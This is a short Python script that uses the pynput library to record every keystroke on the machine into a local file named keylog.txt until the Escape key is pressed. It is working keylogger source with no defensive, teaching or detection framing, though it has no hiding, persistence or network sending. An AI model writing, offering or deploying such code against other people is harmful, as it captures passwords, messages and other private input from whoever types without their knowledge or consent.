from pynput import keyboard

# File to save keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        # Open the log file in append mode
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop the listener on escape key
    if key == keyboard.Key.esc:
        return False

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

